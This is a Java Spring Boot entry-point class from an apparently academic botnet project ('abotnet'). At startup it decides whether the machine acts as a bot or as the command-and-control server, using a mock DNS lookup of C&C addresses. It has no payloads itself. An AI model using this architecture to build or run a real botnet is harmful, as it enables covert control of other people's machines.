package cs.sii.abotnet;

import java.awt.List;
import java.util.ArrayList;
import java.util.Arrays;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.scheduling.annotation.EnableAsync;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.config.onLoad.Initialize;
import cs.sii.control.command.Commando;
import cs.sii.service.connection.NetworkService;

@SpringBootApplication
@ComponentScan("cs.sii")
@EnableJpaRepositories("cs.sii")
@EnableAsync
public class Application {

	@Autowired
	private Config configEngine;

	@Autowired
	private NetworkService nServ;
	
	@Autowired
	private Initialize init;

	@Autowired
	private Behavior bot;

	@Autowired
	private Commando cec;

	public static void main(String[] args) {
		SpringApplication.run(Application.class, args);

	}

	@Bean
	public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
		return args -> {
			init.loadInfo();
			nServ.firstConnectToMockServerDns();
						
			if(nServ.getCommandConquerIps().getList().get(0).getValue1().getIp().equals(nServ.getMyIp().getIp()))
				configEngine.setCommandandconquerStatus(true);
			
			if (!configEngine.isCommandandconquerStatus()) {
				bot.initializeBot();

			} else {
				cec.initializeCeC();

			}

			//
			// System.out.println("Let's inspect the beans provided by Spring
			// Boot:");
			//
			// String[] beanNames = ctx.getBeanDefinitionNames();
			// Arrays.sort(beanNames);
			// for (String beanName : beanNames) {
			// System.out.println(beanName);
			// }
			//

		};
	}

}